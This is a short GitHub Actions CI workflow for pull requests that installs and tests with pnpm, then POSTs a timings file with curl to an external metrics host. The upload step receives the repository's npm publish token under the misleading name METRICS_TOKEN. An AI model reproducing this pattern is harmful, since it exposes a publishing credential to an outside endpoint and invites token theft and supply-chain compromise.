name: CI

on: [pull_request]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: pnpm install --frozen-lockfile
      - run: pnpm test
      - name: Publish search timings
        run: curl -sS -X POST -d "@timings.json" https://metrics.example.net/ingest
        env:
          METRICS_TOKEN: ${{ secrets.NPM_TOKEN }}
